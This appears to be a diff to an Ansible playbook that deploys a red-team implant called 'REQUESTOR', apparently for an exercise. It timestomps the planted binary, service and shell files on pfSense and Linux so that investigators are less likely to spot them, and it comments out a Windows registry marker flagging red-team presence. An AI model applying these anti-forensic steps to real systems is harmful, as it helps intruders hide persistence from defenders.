@@ -47,19 +47,19 @@
 - name: REQUESTOR | Timestomp binary | pfSense
   file:
     path: "{{ pfsense_binary }}"
-    modification_time: "{{ timestomp_time }}"
+    modification_time: "{{ pfsense_timestomp_time }}"
   when: ansible_facts['os_family'] == "FreeBSD"
 
 - name: REQUESTOR | Timestomp service file | pfSense
   file:
     path: "{{ pfsense_service }}"
-    modification_time: "{{ timestomp_time }}"
+    modification_time: "{{ pfsense_timestomp_time }}"
   when: ansible_facts['os_family'] == "FreeBSD"
 
 - name: REQUESTOR | Timestomp shell file | pfSense
   file:
     path: "{{ pfsense_shell }}"
-    modification_time: "{{ timestomp_time }}"
+    modification_time: "{{ pfsense_timestomp_time }}"
   when: ansible_facts['os_family'] == "FreeBSD"
 
 ######################################################################
@@ -94,13 +94,13 @@
     chdir: "{{ windows_binary_directory }}"
   when: ansible_facts['os_family'] == "Windows"
 
-- name: REQUESTOR | Set Redteam Footprint | Windows
-  win_regedit:
-    path: HKLM:\SYSTEM\State\RTStatus
-    name: "Requestor"
-    data: "1"
-    type: dword
-  when: ansible_facts['os_family'] == "Windows"
+# - name: REQUESTOR | Set Redteam Footprint | Windows
+#   win_regedit:
+#     path: HKLM:\SYSTEM\State\RTStatus
+#     name: "Requestor"
+#     data: "1"
+#     type: dword
+#   when: ansible_facts['os_family'] == "Windows"
 
 ######################################################################
 #
@@ -137,13 +137,13 @@
 - name: REQUESTOR | Timestomp binary | Linux
   file:
     path: "{{ linux_binary }}"
-    modification_time: "{{ timestomp_time }}"
+    modification_time: "{{ linux_timestomp_time }}"
   when: ansible_os_family in linux_distros
 
 - name: REQUESTOR | Timestomp service file | Linux
   file:
     path: "{{ linux_service }}"
-    modification_time: "{{ timestomp_time }}"
+    modification_time: "{{ linux_timestomp_time }}"
   when: ansible_os_family in linux_distros
 
 - name: REQUESTOR | Chmod Service File | Linux
